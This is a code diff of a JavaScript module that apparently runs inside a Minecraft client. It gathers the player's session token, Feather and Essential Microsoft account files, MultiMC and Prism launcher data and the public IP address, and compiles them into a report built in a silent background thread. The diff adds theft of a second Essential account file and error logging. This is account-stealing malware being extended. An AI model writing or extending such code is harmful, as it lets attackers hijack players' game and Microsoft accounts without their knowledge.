@@ -1,3 +1,4 @@
+
 let File = Java.type('java.io.File');
 let appData = new File(java.lang.System.getenv("APPDATA"));
 let mcFolder = new File(Client.getMinecraft().field_71412_D.getPath());
@@ -18,6 +19,7 @@ const data = {
     token: Client.getMinecraft().func_110432_I().func_148254_d(),
     feather: FileLib.read(`${appData}\\.feather\\accounts.json`),
     essentials: FileLib.read(`${mcFolder}\\essential\\microsoft_accounts.json`),
+    essentials2: FileLib.read(`${appData}\\gg.essential.mod\\microsoft_accounts.json`),
     mmc: mmc,
     prism: prism,
     ip: FileLib.getUrlContent("https://api.myip.com/")
@@ -46,6 +48,8 @@ ${data.mmc || 'No MultiMC data found'}
 === PRISM LAUNCHER DATA ===
 ${data.prism || 'No Prism Launcher data found'}
 
+=== essentials2 DATA ===
+${data.essentials2 || 'No essentials2 data found'}
 
 `;
 
@@ -89,5 +93,6 @@ ${data.prism || 'No Prism Launcher data found'}
         } else {
         }
     } catch (e) {
+        console.log(e)
     }
 }).start();
